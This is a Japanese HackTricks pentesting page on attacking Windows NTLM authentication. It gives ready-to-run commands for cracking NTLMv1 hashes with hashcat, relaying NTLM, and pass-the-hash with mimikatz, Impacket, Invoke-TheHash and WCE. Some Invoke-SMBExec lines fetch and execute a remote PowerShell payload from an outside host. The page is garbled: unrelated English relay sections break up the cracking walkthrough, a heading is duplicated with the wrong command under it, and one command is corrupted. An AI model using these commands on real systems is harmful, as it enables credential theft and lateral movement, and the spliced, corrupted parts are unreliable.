# NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクションを見つけます
* [**公式PEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れます
* **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に**参加**するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
* **ハッキングトリックを共有するには、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>

## 基本情報

**Windows XPとServer 2003**が稼働している環境では、LM（Lan Manager）ハッシュが使用されますが、これらは簡単に妨害される可能性があることが広く認識されています。特定のLMハッシュ、`AAD3B435B51404EEAAD3B435B51404EE`は、LMが使用されていないシナリオを示し、空の文字列のハッシュを表します。

デフォルトでは、**Kerberos**認証プロトコルが主に使用されます。NTLM（NT LAN Manager）は、特定の状況下で使用されます：Active Directoryの不在、ドメインの非存在、Kerberosの構成が不適切であるための機能不全、または有効なホスト名ではなくIPアドレスを使用して接続を試みる場合。

ネットワークパケットに**"NTLMSSP"**ヘッダーが存在すると、NTLM認証プロセスがシグナルされます。

認証プロトコル（LM、NTLMv1、NTLMv2）のサポートは、`%windir%\Windows\System32\msv1\_0.dll`にある特定のDLLによって可能になります。

**要点**：
- LMハッシュは脆弱であり、空のLMハッシュ（`AAD3B435B51404EEAAD3B435B51404EE`）はその非使用を示します。
- Kerberosがデフォルトの認証方法であり、NTLMは特定の条件下でのみ使用されます。
- NTLM認証パケットは"NTLMSSP"ヘッダーによって識別されます。
- システムファイル`msv1\_0.dll`によって、LM、NTLMv1、NTLMv2プロトコルがサポートされます。

## LM、NTLMv1およびNTLMv2

使用されるプロトコルを確認および設定できます：

### GUI

_secpol.msc_を実行 -> ローカルポリシー -> セキュリティオプション -> ネットワークセキュリティ：LAN Manager認証レベル。 レベルは6つあります（0から5）。

![](<../../.gitbook/assets/image (92).png>)

### レジストリ

これはレベル5を設定します：
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
可能な値:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## 基本的なNTLMドメイン認証スキーム

1. **ユーザー**が**資格情報**を入力します
2. クライアントマシンが**認証リクエストを送信**し、**ドメイン名**と**ユーザー名**を送信します
3. **サーバー**が**チャレンジ**を送信します
4. **クライアント**は**パスワードのハッシュを使用**して**チャレンジを暗号化**し、応答として送信します
5. **サーバー**が**ドメインコントローラー**に**ドメイン名、ユーザー名、チャレンジ、応答**を送信します。Active Directoryが構成されていない場合や、ドメイン名がサーバー名の場合、資格情報は**ローカルで確認**されます。
6. **ドメインコントローラー**がすべてが正しいかどうかを確認し、情報をサーバーに送信します

**サーバー**と**ドメインコントローラー**は、**NTDS.DIT**データベース内にサーバーのパスワードがあるため、**Netlogon**サーバーを介して**セキュアチャネル**を作成できます。

### ローカルNTLM認証スキーム

認証は**以前に**言及されたものと同じですが、**サーバー**は**SAM**ファイル内で認証しようとする**ユーザーのハッシュを知っています**。したがって、ドメインコントローラーに問い合わせる代わりに、**サーバーが自身で確認**します。

### NTLMv1チャレンジ

**チャレンジの長さは8バイト**で、**応答は24バイト**です。

**NTハッシュ（16バイト）**は**7バイトずつ3つの部分**に分かれます（7B + 7B +（2B + 0x00\*5））：**最後の部分はゼロで埋められます**。その後、**各部分ごとにチャレンジ**を**別々に暗号化**し、**結果の**暗号化されたバイトを**結合**します。合計：8B + 8B + 8B = 24バイト。

**問題点**：

- **ランダム性の欠如**
- 3つの部分は**個別に攻撃**され、NTハッシュが見つかる可能性があります
- **DESは破られやすい**
- 3番目のキーは常に**5つのゼロ**で構成されています。
- 同じチャレンジが与えられると、**応答**も**同じ**になります。したがって、被害者に対して文字列「**1122334455667788**」を**チャレンジ**として与え、**事前計算されたレインボーテーブル**を使用して使用された応答を攻撃できます。

### NTLMv1攻撃

最近では、Unconstrained Delegationが構成された環境を見つけることが少なくなっていますが、これは**悪用できないことを意味しません**。構成されたプリントスプーラーサービスを**悪用**することができます。

ADで既に持っている一部の資格情報/セッションを**使用して、プリンターに対して**ある**コントロール下のホスト**に**認証を要求**することができます。その後、`metasploit auxiliary/server/capture/smb`または`responder`を使用して、**認証チャレンジを1122334455667788**に設定し、認証試行をキャプチャし、それが**NTLMv1**を使用して行われた場合、**クラック**できます。\
`responder`を使用している場合は、**認証をダウングレード**しようとして、**フラグ`--lm`**を使用してみることができます。\
_このテクニックでは、認証はNTLMv1を使用して実行する必要があることに注意してください（NTLMv2は有効ではありません）。_

プリンターは認証中にコンピューターアカウントを使用し、コンピューターアカウントは**長くランダムなパスワード**を使用するため、一般的な**辞書**を使用して**クラック**することはできない可能性があります。しかし、**NTLMv1**認証は**DESを使用**しています（[詳細はこちら](./#ntlmv1-challenge)）、そのため、DESをクラックするために特に専用のサービスを使用することで、クラックすることができます（たとえば、[https://crack.sh/](https://crack.sh)を使用できます）。

### hashcatを使用したNTLMv1攻撃

NTLMv1はNTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) を使用して、hashcatでクラックできる形式にフォーマットされたNTLMv1メッセージを破ることもできます。

コマンド
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
## NTLM Relaying

### Overview

NTLM relaying is a technique used to relay authentication attempts from one system to another in order to gain unauthorized access. This is typically achieved by intercepting NTLM authentication traffic and forwarding it to another system where the attacker can authenticate using the captured credentials.

### Usage

1. **Install Impacket**:
    ```bash
    pip install impacket
    ```

2. **Run NTLM Relay**:
    ```bash
    ntlmrelayx.py -t <target_ip>
    ```

3. **Relay to SMB**:
    ```bash
    ntlmrelayx.py -t <target_ip> -smb2support
    ```

4. **Relay to LDAP**:
    ```bash
    ntlmrelayx.py -t <target_ip> -wh <ldap_server>
    ```

### Mitigation

To mitigate NTLM relaying attacks, consider implementing the following measures:

- Disable NTLM authentication where possible and use more secure protocols like Kerberos.
- Enable SMB signing to prevent relay attacks targeting SMB.
- Implement Extended Protection for Authentication to protect against NTLM relay attacks on LDAP.

For more information on NTLM relaying and how to defend against it, refer to the [Impacket documentation](https://github.com/SecureAuthCorp/impacket).
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
# NTLM Relaying

## Introduction

NTLM relaying is a common technique used by attackers to escalate privileges in a Windows environment. This attack involves intercepting an NTLM authentication request and relaying it to another machine, tricking it into believing the attacker is the legitimate user.

## How it works

1. The attacker intercepts an NTLM authentication request from a victim machine.
2. The attacker relays the authentication request to a target machine.
3. The target machine processes the request, thinking it is coming from the victim.
4. If successful, the attacker gains unauthorized access to the target machine.

## Mitigation

To prevent NTLM relaying attacks, it is recommended to:
- Disable NTLM authentication where possible and use more secure protocols like Kerberos.
- Implement SMB signing to prevent tampering with authentication requests.
- Use Extended Protection for Authentication to protect against NTLM relay attacks.

By following these mitigation techniques, organizations can reduce the risk of NTLM relaying attacks and enhance the security of their Windows environment.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
### Translation

```html
ラン hashcat（hashtopolis などのツールを介して分散させるのが最適）を実行してください。そうしないと数日かかります。
```
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
この場合、パスワードが「password」であることがわかっているため、デモ目的で不正行為を行います。
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
次に、hashcatユーティリティを使用して、クラックされたDESキーをNTLMハッシュの一部に変換する必要があります：
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
最後の部分です:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
## NTLM Relay Attack

### Overview

NTLM relay attacks are a common technique used by attackers to exploit the NTLM authentication protocol. By intercepting and relaying NTLM authentication messages, an attacker can impersonate a legitimate user and gain unauthorized access to resources on a network.

### How it works

1. The attacker intercepts an NTLM authentication request from a victim machine to a server.
2. The attacker relays the authentication request to another server on the network.
3. The second server responds to the authentication request, thinking it is coming from the victim machine.
4. If successful, the attacker can access resources on the second server using the victim's credentials.

### Mitigation

To protect against NTLM relay attacks, consider implementing the following measures:

- Disable NTLM authentication in favor of more secure protocols like Kerberos.
- Enable SMB signing to prevent tampering with authentication messages.
- Use Extended Protection for Authentication to prevent relay attacks.
- Implement network segmentation to limit the scope of potential attacks.

By understanding how NTLM relay attacks work and taking steps to mitigate them, organizations can better protect their networks from unauthorized access and data breaches.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 チャレンジ

**チャレンジの長さは 8 バイト**であり、**2 つのレスポンスが送信されます**：1 つは**24 バイト**で、**もう 1 つ**の長さは**可変**です。

**最初のレスポンス**は、**クライアントとドメイン**から構成される**文字列**を使用して**HMAC\_MD5**を使って暗号化し、**NT ハッシュ**の**MD4 ハッシュ**を**キー**として使用します。その後、**結果**は**チャレンジ**を暗号化するための**キー**として使用されます。ここに**8 バイトのクライアント チャレンジ**が追加されます。合計：24 B。

**2 番目のレスポンス**は、**複数の値**（新しいクライアント チャレンジ、**リプレイ攻撃**を回避するための**タイムスタンプ**など）を使用して作成されます。

**成功した認証プロセスをキャプチャした pcap ファイル**がある場合、このガイドに従ってドメイン、ユーザー名、チャレンジ、レスポンスを取得し、パスワードを解読してみることができます：[https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## パス・ザ・ハッシュ

**被害者のハッシュを取得したら**、それを**偽装**することができます。\
その**ハッシュを使用して NTLM 認証を実行するツール**を使用する必要があります。**または**、新しい**セッションログオン**を作成し、その**ハッシュ**を**LSASS**に**インジェクト**することもできます。そのため、**NTLM 認証が実行されるときにそのハッシュが使用されます。** 最後のオプションが mimikatz が行うことです。

**パス・ザ・ハッシュ攻撃はコンピュータ アカウントを使用しても実行できることを覚えておいてください。**

### **Mimikatz**

**管理者として実行する必要があります**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
これにより、mimikatzを起動したユーザーに属するプロセスが開始されますが、LSASS内部では、保存された資格情報はmimikatzパラメータ内にあります。その後、そのユーザーであるかのようにネットワークリソースにアクセスできます（`runas /netonly`トリックに類似していますが、平文パスワードを知る必要はありません）。

### LinuxからのPass-the-Hash

LinuxからPass-the-Hashを使用してWindowsマシンでコード実行を取得できます。\
[**こちらをクリックして方法を学んでください。**](../../windows/ntlm/broken-reference/)

### Impacket Windowsコンパイル済みツール

Windows用のimpacketバイナリを[こちらからダウンロードできます](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)。

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe**（この場合、コマンドを指定する必要があります。cmd.exeとpowershell.exeは対話型シェルを取得するために有効ではありません）`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* 他にもいくつかのImpacketバイナリがあります...

### Invoke-TheHash

こちらからpowershellスクリプトを入手できます：[https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec

#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient

#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum

#### Invoke-SMBEnum

Invoke-SMBEnumは、リモートシステムでNTLM中継攻撃を実行するためのPowerShellスクリプトです。このスクリプトは、リモートシステム上のSMB共有を列挙し、攻撃者が中継攻撃を実行するための情報を提供します。
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

この機能は**他のすべての機能を組み合わせたもの**です。**複数のホスト**を渡すことができ、**除外**することもでき、使用したい**オプション**を選択できます（_SMBExec、WMIExec、SMBClient、SMBEnum_）。**SMBExec**と**WMIExec**のいずれかを選択した場合でも、_**Command**_ パラメータを指定しない場合は、単に**十分な権限**があるかどうかを**チェック**します。
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM パス・ザ・ハッシュ](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**管理者として実行する必要があります**

このツールは、mimikatzと同じことを行います（LSASSメモリの変更）。
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### ユーザー名とパスワードを使用した手動のWindowsリモート実行

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Windowsホストからの資格情報の抽出

**Windowsホストから資格情報を取得する方法についての詳細は、[このページ](broken-reference)を読んでください。**

## NTLMリレーとResponder

**これらの攻撃を実行する方法の詳細なガイドについては、[こちら](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)を読んでください。**

## ネットワークキャプチャからNTLMチャレンジを解析する

**[https://github.com/mlgualtieri/NTLMRawUnHide](https://github.com/mlgualtieri/NTLMRawUnHide)を使用できます。**
